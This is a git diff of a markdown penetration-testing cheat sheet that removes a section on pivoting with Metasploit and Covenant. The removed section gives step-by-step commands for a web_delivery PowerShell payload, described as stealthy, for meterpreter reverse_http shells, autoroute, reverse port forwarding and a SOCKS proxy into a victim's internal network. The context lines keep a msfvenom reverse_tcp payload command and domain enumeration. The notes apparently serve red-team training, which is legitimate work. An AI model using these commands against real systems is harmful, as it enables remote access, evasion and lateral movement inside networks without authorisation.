@@ -169,35 +169,6 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP-OF-ATTACK-MACHINE LPORT
 - `run post/windows/gather/enum_domains` enumerate domains (works better on msf5 than 6)
 - `route` check out routes
 
-## Reverse port forwarding and Session Passing with initial shell on Covenant
-
-- We can assume that we have a shell with covenant for instance
-- We generate a payload with metasploit through web delivery (more stealthy because it can pass as http traffic)
-- `use exploit/multi/script/web_delivery`
-- `set target 2` (for powershell)
-- `set payload windows/x64/meterpreter/reverse_http`
-- set lhost to your attacking machine
-- sel an lport 
-- `exploit -j`
-- Now we can copy the payload and paste to our grunt in Covenant
-- Metasploit should now have opened a session
-- We can choose an interface with `ipconfig`
-- `run autoroute -s 192.168.16.0/24`
-- We can check it's been done using `run autoroute -p`
-- We can now set up a reverse port forward
-- `portfwd add -R -p 1234 -l 443 -L ATTACKING-MACHINE-IP`
-- We can check it's been done using `portfwd`
-- we can background our session with CTRL-Z 
-- We will setup a socks proxy `use auxiliary/server/socks4a`
-- We need to check our port in `/etc/proxychains4.conf`
-- `set srvport 9050`
-- we can check our jobs using `jobs`
-- We can kill the web delivery one that we do not need anymore `jobs -k ID-OF-JOB`
-- We now need to create a listener on covenant that will interact with the port forward set previously:
-  `1      192.168.3.28:443  0.0.0.0:1234  Reverse`
-- BindAddress can stay at 0.0.0.0, BindPort should be 443, connectPort should be 1234 and connect address is the ip of our victime machine.
-- We should now be able to reach other machine in the network of the initial machine that has now route to our attacking machine using proxychains
-
 ## Dump hashes with Hashcat
 
 - We should have a session
